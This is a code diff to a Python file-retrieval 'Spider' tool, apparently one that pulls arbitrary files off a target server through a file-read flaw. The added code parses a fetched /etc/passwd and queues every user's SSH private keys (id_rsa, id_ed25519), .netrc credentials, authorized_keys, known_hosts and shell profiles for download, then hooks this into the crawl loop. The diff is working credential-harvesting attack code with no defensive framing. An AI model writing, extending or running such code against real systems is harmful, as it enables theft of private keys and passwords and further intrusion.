@@ -60,6 +60,47 @@ def find_files(content):
     return {m.decode("ASCII") for m in matches if should_try_download(m.decode("ASCII"))}
 
 
+handlers = {}
+
+
+def filehandler(pattern):
+    def decorator(function):
+        handlers[pattern] = function
+        return function
+    return decorator
+
+
+@filehandler("/etc/passwd")
+def passwd(content):
+    queue = set()
+    content = content.decode("ASCII")
+    for line in content.split("\n"):
+        try:
+            parts = line.split(":")
+            homedir = parts[5]
+            queue |= {os.path.join(homedir, f) for f in [
+                ".netrc",
+                ".ssh/id_rsa",
+                ".ssh/config",
+                ".ssh/authorized_keys",
+                ".ssh/known_hosts",
+                ".ssh/id_ed25519",
+                ".bash_logout",
+                ".bash_profile",
+                ".bashrc",
+            ]}
+        except IndexError:
+            pass
+    return queue
+
+
+def call_handlers(path, content):
+    queue = set()
+    if path in handlers:
+        queue |= handlers[path](content)
+    return queue
+
+
 class Spider:
     def __init__(self, client, args):
         self.client = client
@@ -84,6 +125,7 @@ class Spider:
                     response = self.client.request_file(path)
                     if response:
                         write_file(self.save_dir + path, response)
+                        self.queue |= call_handlers(path, response)
                         print("\u2713 " + path)
                     else:
                         print("0 " + path)
